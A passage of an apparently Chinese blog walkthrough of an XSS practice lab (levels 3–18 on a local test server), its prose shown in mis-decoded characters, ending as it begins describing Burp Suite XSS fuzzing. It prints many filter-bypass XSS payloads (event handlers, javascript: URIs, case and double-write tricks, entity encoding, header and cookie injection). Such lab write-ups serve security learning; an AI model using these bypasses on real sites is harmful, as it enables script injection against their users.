<code>ENT_QUOTES</code>ï¼Œæ‰å¯ä»¥è½¬ä¹‰å•å¼•å·ï¼Œæ‰€ä»¥è¿™å…³çš„valueå€¼æ˜¯åˆšå¥½ç»™äº†è¿™æ ·çš„ä¸€ä¸ªæœºä¼šå»é—­åˆã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvBmn.png" alt="kXvBmn.png"></p><p>æ‰€ä»¥å¯ä»¥æ„å»ºpayloadï¼Œè¿™æ¬¡ç”±äºå¼¹çª—å†…å®¹åœ¨å°–æ‹¬å·å†…ï¼Œå¯ä»¥ä½¿ç”¨äº‹ä»¶å»å¼¹çª—ï¼Œè¿™é‡Œä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„äº‹ä»¶å‡½æ•°ï¼Œæ¯”å¦‚<code>onchange, onclick, oninput</code>ç­‰ç­‰ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨<code>onchange</code>å»å®ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert`123` &apos;</span><br></pre></td></tr></table></figure><p>å¼¹çª—æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxKhT.png" alt="kXxKhT.png"></p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p>åŒæ ·çš„æ–¹æ³•ï¼Œå…ˆç”¨<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>å°è¯•ä¸€ä¸‹ï¼Œå‘ç°æ ‡é¢˜å¤„æ˜¯ç»è¿‡äº†è½¬ä¹‰ï¼Œä½†æ˜¯åœ¨inputæ ‡ç­¾å†…åªæ˜¯è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œå¯ä»¥æ€€ç–‘æ­¤å¤„æ˜¯å¦å‡ºç°ä½¿ç”¨é»‘åå•çš„è¿‡æ»¤ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxa4K.png" alt="kXxa4K.png"></p><p>çœ‹ä¸€ä¸‹ä»£ç ï¼Œè¯å®ä¸€ä¸‹æ€è·¯ï¼Œå‘ç°ç¡®å®å¦‚æ­¤ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨äº‹ä»¶å»è§¦å‘å¼¹çª—ï¼Œè¿™æ ·å°±é¿å…ä½¿ç”¨äº†å°–æ‹¬å·äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxh8S.png" alt="kXxh8S.png"></p><p>è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼Œè·Ÿä¸Šä¸€é¢˜æ˜æ˜¾ä¸åŒï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨åŒå¼•å·é—­åˆï¼Œæ„é€ å¯¹åº”çš„payloadï¼Œç„¶åä½¿ç”¨å¯¹åº”çš„æ³¨é‡Šç¬¦æŠŠåé¢çš„åŒå¼•å·ç»™æ³¨é‡Šæ‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert `123` //</span><br></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p>è¿˜æ˜¯åŸæ¥çš„æµ‹è¯•æ‰‹æ®µï¼Œæ ‡é¢˜å¤„çš„è¾“å‡ºç»è¿‡è½¬ä¹‰æ²¡å•¥åˆ©ç”¨ï¼Œä½†æ˜¯åœ¨inputæ ‡ç­¾å†…ä½ ä¼šå‘ç°æµ‹è¯•çš„scriptæ ‡ç­¾è¢«å˜æˆå…¶ä»–çš„ä¸œè¥¿ï¼Œè¿™å°±å¾ˆæœ‰å¯èƒ½åˆæ˜¯ä¸€ä¸ªæ›¿æ¢ï¼Œå†ç”¨ä¸Šä¸€å…³çš„payloadå»è¯•è¯•ï¼Œä½ ä¼šå‘ç°onå˜æˆäº†o_nï¼Œç›¸å½“äºåŠ äº†ä¸€ä¸ªä¸‹åˆ’çº¿ï¼Œè¿™å°±é™åˆ¶äº†æˆ‘ä»¬ä½¿ç”¨äº‹ä»¶ä»¥åŠæ ‡ç­¾äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjSz7R.png" alt="kjSz7R.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œæœç„¶æºç å¯¹<code>&lt;script</code>ä»¥åŠ<code>on</code>åšäº†è¿‡æ»¤ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjpXPP.png" alt="kjpXPP.png"></p><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>&lt;a&gt;</code>æ ‡ç­¾å»å®ç°å¼¹çª—çš„è°ƒç”¨ï¼Œè¿™ä¸å­˜åœ¨onæˆ–è€…scriptç­‰å…³é”®å­—ï¼Œè¿˜ä½¿ç”¨äº†<code>javascript:alert(&#39;xss&#39;)</code>å»è°ƒç”¨äº†JavaScriptçš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&apos;123&apos;)&quot;&gt;dian&lt;/a&gt; //</span><br></pre></td></tr></table></figure><p>åé¢ç‚¹å‡»å°±ä¼šäº§ç”Ÿå¼¹çª—äº†</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiprD.png" alt="kjiprD.png"></p><p>å®é™…ä¸Šè¿™é¢˜è¿˜å¯ä»¥å¤§å†™ç»•è¿‡çš„ã€‚</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p>åŒæ ·çš„ï¼Œè¾“å…¥&lt;scriptå’Œonéƒ½ä¼šè¢«åŠ ä¸Šä¸‹åˆ’çº¿ï¼Œå†å°è¯•ä¸Šé¢çš„payloadä¼šå‘ç°è¿hreféƒ½è¢«æ›¿æ¢äº†ï¼Œè¿™æ ·æœ‰å¯èƒ½æ˜¯é»‘åå•å¢åŠ äº†ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiAPI.png" alt="kjiAPI.png"></p><p>è§‚å¯Ÿä¸€ä¸‹ä»£ç å¯ä»¥å‘ç°ï¼Œå¯¹äºé»‘åå•é‡Œé¢çš„æ•°é‡ç¡®å®å¢å¤šäº†ï¼Œä½†ä¹Ÿä¸å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§ å°å†™å»å®ç°ç»•è¿‡ï¼Œå¯ä»¥æ„é€ ä¸‹é¢çš„ payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;Script&gt;alert(&apos;123&apos;)&lt;/script&gt; //</span><br><span class="line">&quot;&gt;&lt;a Href=&quot;javascript:alert(123)&quot;&gt;dian&lt;/a&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p>è¾“å…¥çš„æµ‹è¯•ä»£ç ä¼šå‘ç°é‡Œé¢çš„å…³é”®å­—è¢«ç½®æ¢ä¸ºç©ºï¼Œè¿™å¾ˆæ˜æ˜¾å°±æ˜¯ç›´æ¥å°†æŸäº›å…³é”®å­—å˜æˆç©ºå­—ç¬¦</p><p><img src="https://s2.ax1x.com/2019/03/05/kjA0oQ.png" alt="kjA0oQ.png"></p><p>çœ‹ä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥å‘ç°ç¡®å®æ˜¯æŠŠå…³é”®å­—å˜æˆäº†ç©ºå­—ç¬¦ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/05/kjAsWn.png" alt="kjAsWn.png"></p><p>è¿™é‡Œå°±ç”¨åˆ°ä¸€ä¸ªSQLæ³¨å…¥é‡Œé¢ç»å¸¸ç”¨åˆ°çš„æŠ€å·§ï¼ŒåŒå†™ç»•è¿‡ï¼Œæ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(123);&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„å¯¹onï¼Œsrcï¼Œdataï¼ŒhrefåŒå†™ä¹Ÿå¯ä»¥å®ç°åŒæ ·çš„è€Œæ•ˆæœ</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥å‘ç°ï¼Œè¿™æ¬¡çš„è¿‡æ»¤æ¯”å‰é¢çš„å¥½å‡ å…³éƒ½è¦ä¸¥æ ¼ï¼Œä¸ä»…åšäº†è¿‡æ»¤ï¼Œè€Œä¸”è¿˜å¯¹<code>input</code>æ ‡ç­¾é‡Œé¢çš„å†…å®¹ä½¿ç”¨<code>htmlspecialchars</code>å‡½æ•°è½¬ä¹‰äº†ã€‚ä½†æ˜¯å¯ä»¥å‘ç°è¿˜æœ‰ä¸€å¤„è°ƒç”¨çš„å­—ç¬¦ä¸²é‡Œé¢æ²¡æœ‰ä½¿ç”¨è¿™æ ·çš„å‡½æ•°å»è¿›è¡Œé˜²æŠ¤ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ä¸‹åŠŸå¤«</p><p><img src="https://s2.ax1x.com/2019/03/07/kxcjsg.png" alt="kxcjsg.png"></p><p>é‚£ä¹ˆè¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿè¿™é‡Œåªæ˜¯è¿‡æ»¤äº†å…³é”®å­—ã€‚ä½†æ˜¯å¯ä»¥ä½¿ç”¨HTMLç¼–ç è¿›è¡Œç»•è¿‡ï¼ŒHTMLç¼–ç çš„å­˜åœ¨å°±æ˜¯è®©ä»–åœ¨ä»£ç ä¸­å’Œæ˜¾ç¤ºä¸­åˆ†å¼€ï¼Œ é¿å…é”™è¯¯ã€‚æ¨èä¸€ä¸ªç¼–ç ç½‘ç«™ï¼š<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯æµè§ˆå™¨å¦‚æœè¦æŠŠHTMLç¼–ç è§£æå¹¶ä¸”æ¸²æŸ“å‰æå¿…é¡»è¦è¿™ç§ç¼–ç ä¸€å®šè¦åœ¨æ ‡ç­¾å†…æŸä¸ªå±æ€§é‡Œé¢æ‰è¡Œã€‚å¦‚ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;"</span> &gt;click&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é‡Œå¦‚æœä½ æŠŠhrefä¹Ÿç¼–ç çš„è¯ï¼Œè¿™å°±æ— æ³•æ­£å¸¸æ¸²æŸ“äº†</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a &amp;#104;&amp;#114;&amp;#101;&amp;#102;="&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;" &gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥å‚è€ƒä¸Šä¸€å…³çš„payloadï¼Œåˆ©ç”¨åè®®å»ç»•è¿‡ï¼Œåˆ©ç”¨aæ ‡ç­¾ï¼Œä¿®æ”¹é‡Œé¢çš„å±æ€§å€¼å³å¯ï¼Œåªæ˜¯scriptè¿™ä¸ªå…³é”®å­—å¾—è½¬ä¹‰ä¸€éƒ¨åˆ†æ‰è¡Œï¼Œå¦‚ä¸‹</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;ipt:alert(123)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/07/kx24UA.png" alt="kx24UA.png"></p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p>ä»ä»£ç è§’åº¦ä¸Šçœ‹ï¼Œåªæ˜¯å¢åŠ äº†å¯¹äºurlçš„åˆ¤æ–­ï¼Œå…¶å®å¯¹è¿™ä¸€å…³æ²¡æœ‰å¤ªå¤§å½±å“</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRVa9.png" alt="kxRVa9.png"></p><p>ä¸ºä»€ä¹ˆè¿™æ ·è¯´ï¼Ÿåœ¨ä»£ç é‡Œé¢æ²¡å•¥å½±å“çš„éƒ¨åˆ†å°±æ˜¯æ³¨é‡Šäº†ï¼Œåœ¨æŸäº›æŒ–æ˜æ¼æ´çš„è¿‡ç¨‹ä¸­ä½¿ç”¨æ³¨é‡Šå¾€å¾€å¯ä»¥èµ·åˆ°æ„æƒ³ä¸åˆ°çš„æ•ˆæœï¼Œè¿™é‡Œå¯ä»¥åœ¨æ³¨é‡Šé‡Œé¢æ’å…¥å…³é”®å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(1)/*http://x.x.x.x*/</span><br></pre></td></tr></table></figure><p>å½“ç„¶å¦‚æœå•å•ä¸ºäº†å¼¹çª—ï¼Œè¿™æ ·ä¹Ÿè¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(&quot;http://&quot;)</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p>éšæ‰‹æµ‹è¯•äº†å¼¹çª—è¯­å¥ï¼Œå‘ç°è¢«è½¬ä¹‰äº†ï¼Œä½†æ˜¯å‘ç°äº†3ä¸ªéšè—å‚æ•°ï¼Œæœ‰ç‚¹è¹Šè··</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRIZ4.png" alt="kxRIZ4.png"></p><p>æ¥åˆ†æä¸€ä¸‹æºä»£ç ï¼Œå‘ç°keywordå‚æ•°ç»è¿‡äº†<code>htmlspecialchars</code>å‡½æ•°çš„é˜²æŠ¤è€Œä¸”æ˜¯ä»¥åŒå¼•å·æ‹¼æ¥çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ©ç”¨ä»·å€¼å¾ˆä½ï¼Œä½†å‘ç°å¦å¤–ä¸€ä¸ªt_sortå‚æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‚æ•°ç»è¿‡äº†è¿‡äº†å°–æ‹¬å·çš„è¿‡æ»¤ï¼Œæœ€åè¾“å‡ºåˆ°å…¶ä¸­ä¸€ä¸ªéšè—çš„inputæ ‡ç­¾å†…</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWSdH.png" alt="kxWSdH.png"></p><p>è™½ç„¶è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œä½†å¯ä»¥é—­åˆåŒå¼•å·ï¼Œä½¿ç”¨<code>onclick</code>äº‹ä»¶ï¼Œç„¶åæŠŠéšè—çš„æ ‡ç­¾ç”¨<code>text</code>æ–¹å¼å›æ˜¾å‡ºæ¥å³å¯ï¼Œæœ€åçš„payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=<span class="string">" onclick="</span>alert(<span class="number">123</span>)<span class="string">" type="</span>text<span class="string">" "</span><span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p>åŒæ ·çš„æƒ…å†µæ˜æ˜¾çš„è¾“å‡ºç‚¹è¢«è½¬ä¹‰ï¼Œä½†æ˜¯å­˜åœ¨å‡ ä¸ªéšè—çš„inputæ ‡ç­¾ï¼ŒåŒæ ·çš„è§‚å¯Ÿä¸€ä¸‹ä»£ç ï¼Œå‘ç°åˆšæ‰åˆ©ç”¨çš„åœ°æ–¹å…¨éƒ½åŠ ä¸Šäº†é˜²æŠ¤ï¼Œä½†æ˜¯å¤šå‡ºçš„ä¸€ä¸ªæ ‡ç­¾å†…ç›´æ¥è¾“å‡º$str33ï¼Œå¾€å›æ‰¾è¿™ä¸ªå˜é‡æ¥è‡ªå“ªé‡Œï¼Œå‘ç°æ¥è‡ªhttpå¤´ï¼Œæ‰€ä»¥æ€è·¯å¾ˆæ˜ç¡®ï¼Œä¼ªé€ httpå¤´éƒ¨ä¿¡æ¯å³å¯ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWwf1.png" alt="kxWwf1.png"></p><p>æŠ“ä¸ªåŒ…ä¿®æ”¹é‡Œé¢çš„<code>HTTP_REFERER</code>å‚æ•°ï¼Œpayloadä¹Ÿæ˜¯åŸæ¥çš„payloadï¼Œå› ä¸ºè¿™é‡Œçš„è¾“å‡ºç‚¹çš„è¿‡æ»¤è·Ÿä¸Šä¸€å…³ä¸€æ ·ï¼Œä¹Ÿæ˜¯è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œä½†æ— æ‰€è°“ç”¨åŒå¼•å·é—­åˆå³å¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kz6bOe.png" alt="kz6bOe.png"></p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p>åŒæ ·çš„ï¼Œè§‚å¯Ÿä»£ç ï¼Œå‘ç°è¿™é¢˜è·Ÿä¸Šé¢çš„é¢˜ç›®ç±»ä¼¼ï¼Œåˆ©ç”¨çš„è¾“å‡ºç‚¹åœ¨<code>$str33</code>è¿™ä¸ªå˜é‡ä¸Šï¼Œåªæ˜¯è¿™ä¸€æ¬¡ä¿®æ”¹çš„å¤´éƒ¨ä¿¡æ¯ä¸ä¸€æ ·äº†ï¼Œå¯ä»¥å‘ç°è¿™æ¬¡çš„å¤´éƒ¨ä¿¡æ¯æ˜¯<code>HTTP_USER_AGENT</code></p><p><img src="https://s2.ax1x.com/2019/03/08/kzgbad.png" alt="kzgbad.png"></p><p>ç±»ä¼¼çš„payloadï¼ŒæŠ“åŒ…å‘åŒ…å³å¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kzRPOO.png" alt="kzRPOO.png"></p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p>åˆ†æä¸€ä¸‹æºç ï¼Œå‘ç°è¿™ä¸€æ¬¡ä¸æ˜¯ä»httpå¤´ä¸‹åŠŸå¤«äº†ï¼Œè€Œæ˜¯ä»cookieè¿™ä¸€ç‚¹å…¥æ‰‹äº†ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç é‡Œé¢é¦–å…ˆå¯¹cookieè¿›è¡Œä¸€ä¸ªåˆå§‹å€¼çš„è®¾ç½®ï¼Œç„¶åç»è¿‡äº†ä¸¤æ¬¡çš„è¿‡æ»¤ï¼Œæœ€åé€šè¿‡$str33è¿™ä¸ªå˜é‡è¾“å‡ºã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kzfmsf.png" alt="kzfmsf.png"></p><p>å› ä¸ºè¿‡æ»¤å’Œè¾“å‡ºç‚¹æ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼è¿˜æ˜¯ä¸Šä¸€å…³çš„æ–¹å¼ï¼Œåªæ˜¯è¾“å…¥ç‚¹å˜äº†è€Œå·²ï¼Œè¿™æ¬¡ä»cookieä¸­çš„userå˜é‡è¿›è¡Œè¾“å…¥ï¼ŒåŒæ ·çš„payloadï¼š<code>&quot; onclick=&quot;alert(123)&quot;  type=&quot;text&quot; &quot;</code>ï¼ŒæŠ“åŒ…æ”¹åŒ…å³å¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kzhC60.png" alt="kzhC60.png"></p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p>è¿™ä¸€å…³åˆ©ç”¨äº†å›¾ç‰‡exifçš„å±æ€§ï¼Œç»è¿‡ä¸Šä¼ ä¹‹åå¯ä»¥åˆ©ç”¨é‡Œé¢çš„å±æ€§å»è§¦å‘xssæ¼æ´ï¼Œå¯æƒœæ²¡ç¯å¢ƒã€‚ç›´æ¥è·³åˆ°ä¸‹ä¸€å…³å§</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p>è§‚å¯Ÿæºç ï¼Œå¯ä»¥å‘ç°è¾“å‡ºç‚¹ç”¨å‡½æ•°åšäº†é˜²æŠ¤ï¼Œè€Œä¸”æ¯”èµ·å‰é¢å‡ å…³å¤šäº†å¾ˆå¤šä¸åŒç‚¹ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4u5Q.png" alt="kz4u5Q.png"></p><p>è¿™é‡ŒåŒ…å«äº†angular jsçš„è„šæœ¬ï¼Œå¹¶ä¸”ä½¿ç”¨äº†å®ƒçš„ç›¸å…³ç±»:<code>ng-include</code>ï¼Œç™¾åº¦å¯çŸ¥è¿™æ˜¯ä¸€ä¸ªæœ‰æ–‡ä»¶åŒ…å«åŠŸèƒ½çš„ç±»ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4jRs.png" alt="kz4jRs.png"></p><p>è¿™æ ·çš„è¯ï¼Œæ€è·¯å°±å‡ºæ¥äº†ï¼Œè¿™ä¸ªé¡µé¢æ²¡åˆ©ç”¨ç‚¹ï¼Œä½†æ˜¯åˆ©ç”¨å¦å¤–ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„é¡µé¢ä¸å°±å¯ä»¥äº†å—ï¼Ÿå› ä¸ºè¿™é‡Œä½¿ç”¨äº†å‡½æ•°é˜²æŠ¤ï¼Œå‡ºç°å°–æ‹¬å·çš„ä¸œè¥¿å¾ˆæœ‰å¯èƒ½ä¼šè¢«è½¬ä¹‰ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©é€šè¿‡é—­åˆäº§ç”Ÿxssæ¼æ´çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œé€‰æ‹©level-2ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level2.php?keyword=&quot; onclick=&quot;alert(123)&quot; &quot;&apos;</span><br></pre></td></tr></table></figure><p>å¼¹çª—æˆåŠŸ</p><p><img src="https://s2.ax1x.com/2019/03/08/kzomVK.png" alt="kzomVK.png"></p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p>æŸ¥çœ‹ç¬¬16å…³çš„ä»£ç ï¼Œå‘ç°è¾“å…¥çš„ä¸œè¥¿ç»è¿‡äº†å¤§å°å†™çš„è½¬æ¢å¹¶ä¸”é€šè¿‡å››æ¬¡çš„æ›¿æ¢æ£€æŸ¥ï¼Œåˆ†åˆ«å¯¹scriptï¼Œç©ºæ ¼ï¼Œ/ï¼Œè¿›è¡Œäº†æ›¿æ¢ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼Œå°–æ‹¬å·æ²¡æœ‰è¢«æ›¿æ¢ï¼Œè¿™ç»™æˆ‘ä»¬ç•™ä¸‹å¾ˆå¤§çš„åˆ©ç”¨ç©ºé—´ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoGrt.png" alt="kzoGrt.png"></p><p>å¦å¤–scriptè¢«æ›¿ä»£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨imgæ ‡ç­¾ï¼Œå‰©ä¸‹æˆ‘ä»¬å°±éœ€è¦è€ƒè™‘å¦‚ä½•æŠŠç©ºæ ¼çš„å½±å“ç»™å»æ‰ï¼Œè¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨ç¼–ç æ¥è¿›è¡Œç»•è¿‡äº†ï¼Œå¯ä»¥é€‰æ‹©<code>%0d</code> <code>%0a</code> è¿›è¡Œç»•è¿‡ï¼Œæ„é€ å‡ºæœ€åçš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0dsrc=1%0donerror=&quot;alert(123)&quot;&gt;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹çª—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoOiD.png" alt="kzoOiD.png"></p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p>åˆ†æä¸€ä¸‹ä»£ç ï¼Œå‘ç°è¾“å‡ºç‚¹éƒ½è¿›è¡Œäº†é˜²æŠ¤ï¼Œå¯¹å°–æ‹¬å·ä»¥åŠåŒå¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼Œä½†æ˜¯ä¸å½±å“æˆ‘ä»¬åˆ©ç”¨ã€‚</p><p><img src="https://s2.ax1x.com/2019/03/08/kzbrfU.png" alt="kzbrfU.png"></p><p><code>&lt;embed&gt;</code>æ ‡ç­¾å®šä¹‰åµŒå…¥çš„å†…å®¹ï¼Œæ¯”å¦‚æ’ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨onäº‹ä»¶å»è¿›è¡Œè§¦å‘ï¼Œä½†æ˜¯é¦–å…ˆå¾—ç”¨bå»é—­åˆå‰é¢çš„ç­‰å·ï¼Œæ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹çª—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzq64f.png" alt="kzq64f.png"></p><p>æŸ¥çœ‹è¾“å‡ºéªŒè¯ä¸€ä¸‹æ€è·¯</p><p><img src="https://s2.ax1x.com/2019/03/08/kzqBDA.png" alt="kzqBDA.png"></p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p>è·Ÿä¸Šé¢é‚£ä¸€ä¸ªé¢˜ç›®æ²¡æœ‰å•¥åŒºåˆ«ï¼Œä¸€æ ·çš„æ“ä½œã€‚ã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level18.php?arg01=a&amp;arg02=b%20onmouseout=alert(1)</span><br></pre></td></tr></table></figure><p>ç›´æ¥å¼¹çª—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLZqA.png" alt="kzLZqA.png"></p><p>çœ‹çœ‹è¾“å‡ºï¼Œè·Ÿä¸Šä¸€å…³å·®ä¸å¤š</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLGrj.png" alt="kzLGrj.png"></p><p>ä¸Šé¢çš„æ¸¸æˆéƒ½æ˜¯ç›´æ¥çœ‹æºä»£ç æ‰å‘è§‰åˆ°å“ªé‡Œæœ‰æ¼æ´ï¼Œé‚£ä¹ˆè‚¯å®šé—®é¢˜æ¥äº†ï¼Œå¦‚æœä¸ç»™æºç çš„æƒ…å†µä¸‹è¯¥æ€æ ·å»æµ‹è¯•å‘¢ï¼Ÿå› ä¸ºåœ¨ç°å®æ¸—é€ä¸­æˆ‘ä»¬éœ€è¦ä¸€ä¸ªä¸ªpayloadæµ‹è¯•æ˜¯å¾ˆéº»çƒ¦çš„</p><p>è¿™é‡Œæˆ‘æä¾›ä¸€ç§æ¯”è¾ƒå¤§ä¼—ä¸€ç‚¹çš„fuzzæŠ€å·§ã€‚åˆ©ç”¨burpsuitè‡ªåŠ¨åŒ–xss</p><p>é¦–å…ˆæˆ‘ä»¬å¾—åœ¨burpsuitçš„Extenderæ¨¡å—ä¸­ä¸‹è½½å¯¹åº”çš„<code>XSS Validator</code>æ’ä»¶</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjkxU.png" alt="kzjkxU.png"></p><p>å®‰è£…æˆåŠŸåå¯ä»¥å‘ç°èœå•æ ä¸Šä¼šå¤šä¸€æ ä½ æ’ä»¶çš„åå­—</p><p><img src="https://s2.ax1x.com/2019/03/08/kzORmj.png" alt="kzORmj.png"></p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦å¦å¤–ä¸€ä¸ªä¸œè¥¿å«<code>PhantomJs</code>ï¼Œè¿™æ˜¯ä¸‹è½½åœ°å€ï¼š<a href="http://phantomjs.org/download.htmlï¼Œå¦å¤–æˆ‘ä»¬éœ€è¦åœ¨xssValidatorçš„githubä¸Šä¸‹è½½ä¸€ä¸ªå°è„šæœ¬" target="_blank" rel="noopener">http://phantomjs.org/download.htmlï¼Œå¦å¤–æˆ‘ä»¬éœ€è¦åœ¨xssValidatorçš„githubä¸Šä¸‹è½½ä¸€ä¸ªå°è„šæœ¬</a></p><p><img src="https://s2.ax1x.com/2019/03/08/kzXKgS.png" alt="kzXKgS.png"></p><p>ç„¶åæŠŠå®ƒæ”¾åœ¨è·Ÿ<code>Phantomjs</code>åŒä¸€çº§ç›®å½•ä¸‹å³å¯ï¼Œç„¶ååˆ©ç”¨<code>Phantomjs</code>æ‰“å¼€å³å¯ï¼Œæ­¤æ—¶å¼€å§‹ç›‘å¬</p><p><img src="https://s2.ax1x.com/2019/03/08/kzXjKg.png" 